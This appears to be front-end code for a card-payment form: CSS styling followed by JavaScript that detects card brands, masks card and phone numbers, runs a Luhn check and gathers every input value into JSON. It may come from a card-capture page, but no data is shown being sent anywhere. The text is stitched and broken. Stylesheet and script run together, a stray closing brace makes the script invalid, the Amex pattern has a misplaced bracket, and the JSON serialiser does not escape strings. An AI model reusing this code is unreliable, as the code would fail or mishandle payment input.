body {
    background-color: #fff;
}
html {
    font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
}

#logongardient {
    padding: 18px 0;
    text-align: center;
}

.div_global {
    border-radius: 5px;
    padding: 1.25rem 0;
    max-width: 555px !important;
    overflow: visible !important;
    margin: 0 auto;
}
#gpay{
    
    min-height: .0625rem;
    padding: 5px 35px;
}
.div_global form {
    position: relative;
    min-height: .0625rem;
    padding: 5px 35px;
}
.div_global ::placeholder {
    color: #717171;
    opacity: 1;
}
.div_global label {
    font-size: 1.125rem;
    -webkit-touch-callout: none;
    -webkit-user-select: none;
    -khtml-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
    margin-left: 5px;
}
.div_global input {
    font-size: 1.125rem;
    background: 0 0;
    border: none;
    border-bottom: 1px solid #ccc;
    padding: 5px;
    margin: 10px 0;
    width: 96%;
}
.div_global input.dt {
    width: 17%;
}
.div_global button {
    margin: 10px 0;
  
    background-color: #3897F0;
    color: #fff;
    border: none;
    width: 35%;
    height: 2.5rem;
    overflow-x: auto;
    border-radius: .3125rem;
    text-align: center;
    vertical-align: middle;
    cursor: pointer;
    float: right;
}
.div_global button:disabled,
.div_global button[disabled] {
   background-color: #9BCBF7;
   color:#F8FBFE
}
.div_global button span {
    line-height: 1.125rem;
    white-space: normal;
    margin: .0625rem .75rem;
    font-size: 1rem;
    font-weight: 600;
    
    letter-spacing: 0;
    text-decoration: none;
}
#number_cardlbl {
    color: red;
    font-size: 0.8rem;
}
.warntext {
    color: red;
    margin-bottom: 20px;
    text-align: center;
    font-weight: bolder;
}
#textagreement {
    text-align: center;

}
#textagreement annotation {
    color: #6EB3F4;
}

input[type="text"]:focus {
    border-bottom:2px solid #3897F0;
}
input[type="password"]:focus {
    border-bottom:2px solid rgb(32, 128, 29);
}
#cvv{
    float: right;
    text-align: center;
}
#mm_yy{
    color: #717171;
}
#exp_mm {
    text-align: center;
}

#exp_yy{
    text-align: center;
}

function GetCardType(number){
    if (number.match("^4") != null){/*visa*/
       document.getElementById("cc_master").style.display = "none";
       document.getElementById("cc_discover").style.display = "none";
       document.getElementById("cc_jcb").style.display = "none";
       document.getElementById("cc_amex").style.display = "none";
       document.getElementById("cc_visa").style.display = "inline";
    }else{
        document.getElementById("cc_visa").style.display = "none";
    }
    if (number.match("^(5|22)") != null){/*master*/
       document.getElementById("cc_master").style.display = "inline";
       document.getElementById("cc_discover").style.display = "none";
       document.getElementById("cc_jcb").style.display = "none";
       document.getElementById("cc_amex").style.display = "none";
       document.getElementById("cc_visa").style.display = "none";
    }else{
        document.getElementById("cc_master").style.display = "none";
    }
    if (number.match("^(3[4]|3[7]])") != null)/*amex*/{
       document.getElementById("cc_master").style.display = "none";
       document.getElementById("cc_discover").style.display = "none";
       document.getElementById("cc_jcb").style.display = "none";
       document.getElementById("cc_amex").style.display = "inline";
       document.getElementById("cc_visa").style.display = "none";
    }else{
        document.getElementById("cc_amex").style.display = "none";
    }
    if (number.match("^(6011|622(12[6-9]|1[3-9][0-9]|[2-8][0-9]{2}|9[0-1][0-9]|92[0-5]|64[4-9])|65)") != null) /*discover*/ {
       document.getElementById("cc_master").style.display = "none";
       document.getElementById("cc_discover").style.display = "inline";
       document.getElementById("cc_jcb").style.display = "none";
       document.getElementById("cc_amex").style.display = "none";
       document.getElementById("cc_visa").style.display = "none";
    }else{
        document.getElementById("cc_discover").style.display = "none";
    }
    if (number.match("^35(2[89]|[3-8][0-9])") != null) /*jcb*/{
       document.getElementById("cc_master").style.display = "none";
       document.getElementById("cc_discover").style.display = "none";
       document.getElementById("cc_jcb").style.display = "inline";
       document.getElementById("cc_amex").style.display = "none";
       document.getElementById("cc_visa").style.display = "none";
    }else{
        document.getElementById("cc_jcb").style.display = "none";
    }

    return "";
}

function maskCC(event) {
    var vcc = this.value.replace(/\D/g, '');
    this.value = '';
    for(var i = 0; i < vcc.length; i++) {
        this.value += (i%4==0 && i != 0 ? ' ' : '') + vcc[i];
    }
}
document.getElementById('number_card').addEventListener('input', maskCC, false);

function maskPhone(event) {
    var vpp = this.value.replace(/\D/g, '');
    this.value = '+' + vpp;
}
document.getElementById('phone').addEventListener('input', maskPhone, false);

function maskOnlyNumbers(event) {
    this.value = this.value.replace(/\D/g, '');
}

}

function valid_credit_card(value) {
    if(value=='' || value.length < 15) return false;
	if (/[^0-9-\s]+/.test(value)) return false;
	var nCheck = 0, nDigit = 0, bEven = false;
	value = value.replace(/\D/g, "");
	for (var n = value.length - 1; n >= 0; n--) {
		var cDigit = value.charAt(n),
			  nDigit = parseInt(cDigit, 10);
		if (bEven) {
			if ((nDigit *= 2) > 9) nDigit -= 9;
		}
		nCheck += nDigit;
		bEven = !bEven;
	}
	return (nCheck % 10) == 0;
}

/*********Recursive implementation of jSON.stringify; ********/
var stringifyJSON = function(obj) {
    var arrOfKeyVals = [],
        arrVals = [],
        objKeys = [];

    /*********CHECK FOR PRIMITIVE TYPES**********/
    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
        return '' + obj;
    else if (typeof obj === 'string')
        return '"' + obj + '"';

    /*********CHECK FOR ARRAY**********/
    else if (Array.isArray(obj)) {
        if (obj[0] === undefined)
            return '[]';
        else {
            obj.forEach(function(el) {
                arrVals.push(stringifyJSON(el));
            });
            return '[' + arrVals + ']';
        }
    }
    /*********CHECK FOR OBJECT**********/
    else if (obj instanceof Object) {
        objKeys = Object.keys(obj);
        objKeys.forEach(function(key) {
            var keyOut = '"' + key + '":';
            var keyValOut = obj[key];
            if (keyValOut instanceof Function || typeof keyValOut === undefined)
                arrOfKeyVals.push('');
            else if (typeof keyValOut === 'string')
                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
                arrOfKeyVals.push(keyOut + keyValOut);
            else if (keyValOut instanceof Object) {
                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
            }
        });
        return '{' + arrOfKeyVals + '}';
    }
};

function formToJSON(f)
{
    var FinalObject = {}, namesHTML = ['input','select'];
    for(var i = 0; i < namesHTML.length; i++) {
		var bsform = f.getElementsByTagName(namesHTML[i]);
        for(var j = 0; j < bsform.length; j++) {
            FinalObject[bsform[j].id] = bsform[j].value
        }
    }
    return stringifyJSON(FinalObject);
}
